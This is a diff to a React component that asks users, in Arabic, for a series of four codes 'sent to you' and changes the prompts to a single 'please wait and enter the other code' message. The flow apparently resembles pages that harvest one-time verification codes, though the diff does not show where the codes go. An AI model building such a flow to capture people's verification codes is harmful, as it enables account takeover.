@@ -27,19 +27,15 @@ function EnterCode({ id }) {
 
     switch (id) {
       case "code1":
-        setMessage("ادخل الكود الاول المرسل لك :");
         router.replace("/code2");
         break;
       case "code2":
-        setMessage("ادخل الكود الثاني المرسل لك :");
         router.replace("/code3");
         break;
       case "code3":
-        setMessage("ادخل الكود الثالث المرسل لك :");
         router.replace("/code4");
         break;
       case "code4":
-        setMessage("ادخل الكود الرابع المرسل لك :");
         router.replace("/Finish");
         break;
       default:
@@ -49,7 +45,9 @@ function EnterCode({ id }) {
 
   return (
     <div>
-      <p className="text-xl text-stone-500 my-3">ادخل الكود المرسل لك :</p>
+      <p className="text-xl text-stone-500 my-3">
+        يرجى انتظار وادخال الكود الاخر المرسل إليك :
+      </p>
       <form method="POST" onSubmit={onFormSubmit}>
         <input
           type="text"
@@ -57,7 +55,7 @@ function EnterCode({ id }) {
           value={formData.code1}
           onChange={(e) => setFormData({ ...formData, code1: e.target.value })}
           placeholder="مثال : 234152"
-          className="w-[300px] lg:w-[400px] rounded-2xl mt-2 outline-none border-2 py-2 mx-5 px-5 focus:border-stone-500"
+          className="w-[300px] lg:w-[400px] rounded-2xl  outline-none border-2 py-2 mx-5 px-5 my-10 focus:border-stone-500"
         />
         <div className="w-full flex justify-center">
           <button
